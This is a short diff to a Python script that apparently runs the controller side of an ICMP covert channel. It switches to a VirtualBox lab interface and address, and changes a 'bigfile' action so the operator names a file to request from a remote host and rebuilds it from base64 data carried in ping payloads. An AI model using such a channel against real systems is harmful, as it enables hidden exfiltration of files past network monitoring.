@@ -4,8 +4,8 @@ import base64
 import subprocess
 import time
 
-sniffInterface = "VMware Network Adapter VMnet8"
-destination = "192.168.18.129"
+sniffInterface = "vboxnet0"
+destination = "192.168.56.103"
 keptAliveClients = dict() # Map
 maxKeepAlive = 30
 
@@ -74,9 +74,11 @@ if __name__ == "__main__":
                 fh.write(base64.decodebytes(base64File))
 
         elif action == "bigfile":
-            icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=4)        
-            fileName = icmpReceived[0][3].fields.get("load").decode("utf-8")
-            numberOfPingsToReceive = icmpReceived[2][3].fields.get("load").decode("utf-8")
+            fileName = input("Wich file should we get ?\n")
+            sendMessage(destination, fileName)
+            icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=2)        
+            #fileName = icmpReceived[0][3].fields.get("load").decode("utf-8")
+            numberOfPingsToReceive = icmpReceived[0][3].fields.get("load").decode("utf-8")
             numberOfPingsToReceive = int(numberOfPingsToReceive)
             print(f'Number of pings to receive: {numberOfPingsToReceive}')
             print(f'Filename: {fileName}')
